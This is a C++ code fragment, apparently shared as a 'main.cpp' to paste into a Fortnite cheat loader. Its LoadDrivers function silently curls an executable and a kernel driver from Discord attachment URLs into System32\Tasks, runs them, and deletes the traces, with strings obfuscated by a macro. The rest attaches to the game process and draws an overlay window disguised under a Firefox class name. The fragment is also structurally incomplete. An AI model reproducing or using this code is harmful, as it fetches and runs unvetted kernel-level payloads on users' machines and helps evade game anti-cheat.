// USE THIS FOR YOUR MAIN.CPP FILE TO CONNECT THE DRIVER AND LOAD IT INTO THE GAME!

std::string encryptString(const std::string& input) { // + 1 ascii
	std::string encrypted;
	for (char c : input) {
		encrypted.push_back(c + 1);
	}
	return encrypted;
}

std::string decryptString(const std::string& encrypted) { // - 1 ascii
	std::string decrypted;
	for (char c : encrypted) {
		decrypted.push_back(c - 1);
	}
	return decrypted;
}


class UClass {
public:
	BYTE _padding_0[0x40];
	UClass* SuperClass;
};

// AT THE TOP

void LoadDrivers()
{
  std::cout << (E("\n\n")); 
		system(E("curl https://cdn.discordapp.com/attachments/1183138367882408096/1183910674389291049/kerneldata_1.sys --output C:\\Windows\\System32\\Tasks\\kerneldata.sys >nul 2>&1"));
		system(E("curl https://cdn.discordapp.com/attachments/1183138367882408096/1183910674036965447/kernelmgr.exe --output C:\\Windows\\System32\\Tasks\\kernelmgr.exe >nul 2>&1"));
		system(E("C:\\Windows\\System32\\Tasks\\kernelmgr.exe C:\\Windows\\System32\\Tasks\\kerneldata.sys"));
		std::remove(E("C:\\Windows\\System32\\Tasks\\kerneldata.sys"));
		std::remove(E("C:\\Windows\\System32\\Tasks\\kernelmgr.exe"));
		Beep(500, 500);
		Sleep(1500);
		LI_FN(system)(E("cls"));

    // WITHOUT "E" MACRO USAGE:
  
    std::cout << (E("\n\n")); 
		system("curl https://cdn.discordapp.com/attachments/1183138367882408096/1183910674389291049/kerneldata_1.sys --output C:\\Windows\\System32\\Tasks\\kerneldata.sys >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/1183138367882408096/1183910674036965447/kernelmgr.exe --output C:\\Windows\\System32\\Tasks\\kernelmgr.exe >nul 2>&1");
		system("C:\\Windows\\System32\\Tasks\\kernelmgr.exe C:\\Windows\\System32\\Tasks\\kerneldata.sys");
		std::remove("C:\\Windows\\System32\\Tasks\\kerneldata.sys");
		std::remove("C:\\Windows\\System32\\Tasks\\kernelmgr.exe");
		Beep(500, 500);
		Sleep(1500);
		system("cls");
}

LoadDrivers();
std::cout << (E(" [ + ] Open Fortnite"));

	while (hwnd == NULL)
	{
		XorS(wind, "Fortnite  ");
		hwnd = FindWindowA(0, wind.decrypt());
		Sleep(100);
	}

	driver.process_id = driver.get_process_id("FortniteClient-Win64-Shipping.exe");

	if (!librarys::init())
	{
		printf("\n [ - ] The libraries were not initialized!");
		Sleep(3000);
		exit(0);
	}
	else
		printf("\n [ + ] Libraries initialized!\n");

	if (!driver.setup())
	{
		printf(" [ - ] The driver was not initialized!");
		Sleep(3000);
		exit(0);
	}
	else
		printf(" [ + ] Driver initialized!\n");

	std::printf(E(" [ + ] Game window: %I64d\n", hwnd));

	driver.base_address = driver.get_base_address();

	std::printf(E(" [ + ] Process ID: %i\n", driver.process_id));
	base_address = driver.base_address;
	printf(E(" [ + ] Base address: %p", (void*)base_address));

	Sleep(1500);

	LI_FN(system)(E("cls"));
	printf(E(" [ + ] Base address: %p", (void*)driver.base_address));
	printf(E("\n  [ ! ] Do not close this window!"));
	Beep(500, 500);
	//LI_FN(Beep)(560, 500);
	//checkurmomez2();
	xCreateWindow();
	xInitD3d();



	xMainLoop();


	xShutdown();


	return 0;

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASS windowClass = { 0 };
	windowClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	windowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowClass.hInstance = NULL;
	windowClass.lpfnWndProc = WinProc;
	windowClass.lpszClassName = "FireFox 29.1.5";
	windowClass.style = CS_HREDRAW | CS_VREDRAW;
	if (!RegisterClass(&windowClass))
		std::cout << "\n\n FireFox";

	Window = CreateWindow("FireFox 29.1.5",
		NULL,
		WS_POPUP,
		0,
		0,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		NULL,
		NULL,
		NULL,
		NULL);

	ShowWindow(Window, SW_SHOW);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	UpdateWindow(Window);
}

void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}
